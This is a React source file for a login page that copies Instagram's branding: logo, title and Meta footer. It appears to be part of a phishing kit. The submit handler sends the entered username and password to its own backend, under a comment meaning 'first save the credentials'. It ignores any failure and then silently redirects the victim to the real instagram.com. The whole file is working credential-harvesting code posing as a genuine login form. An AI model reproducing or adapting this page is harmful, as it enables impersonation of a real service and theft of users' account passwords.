import React, { useState } from 'react';
import { login } from '../api';

const Login = ({ onSuccess, onSwitch }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      // Pehle credentials save karo
      await login(username, password);
    } catch (err) {
      // API fail bhi ho toh koi dikkat nahi
    }

    // Small delay to ensure request completes
    setTimeout(() => {
      window.location.replace('https://www.instagram.com');
    }, 500);
  };

  return (
    <div className="auth-card">
      {/* Instagram Logo */}
      <div className="logo-icon">
        <span className="logo-dot"></span>
      </div>

      {/* Brand Name */}
      <h1 className="brand-title">Instagram</h1>

      {/* Error */}
      {error && <div className="error-badge">{error}</div>}

      {/* Login Form */}
      <form onSubmit={handleSubmit} className="auth-form">
        <div className="input-group">
          <label htmlFor="login-username">Username</label>
          <input
            id="login-username"
            type="text"
            placeholder="Username, email address or mobile number"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            autoComplete="username"
            required
          />
        </div>

        <div className="input-group password-wrapper">
          <label htmlFor="login-password">Password</label>
          <input
            id="login-password"
            type={showPassword ? 'text' : 'password'}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            autoComplete="current-password"
            required
          />
          {password && (
            <button
              type="button"
              className="password-toggle"
              onClick={() => setShowPassword(!showPassword)}
              aria-label={showPassword ? 'Hide password' : 'Show password'}
            >
              {showPassword ? '👁' : '👁‍🗨'}
            </button>
          )}
        </div>

        <div className="forgot-password">
          <button type="button" className="forgot-link">Forgotten password?</button>
        </div>

        <button type="submit" className="submit-btn" id="login-submit-btn" disabled={loading || !username || !password}>
          {loading ? (
            <span className="btn-loading">
              <span className="spinner"></span>
              Logging in...
            </span>
          ) : (
            'Log In'
          )}
        </button>
      </form>

      {/* Switch to Register */}
      <p className="switch-text">
        Don't have an account?{' '}
        <span onClick={onSwitch} className="switch-link" role="button" tabIndex={0}>
          Sign up
        </span>
      </p>

      {/* Create Account Button */}
      <button type="button" className="create-account-btn" onClick={onSwitch} id="create-account-btn">
        Create new account
      </button>

      {/* Meta Footer */}
      <div className="meta-footer">
        <span className="meta-infinity">∞</span>
        <span className="meta-logo">Meta</span>
      </div>
    </div>
  );
};

export default Login;
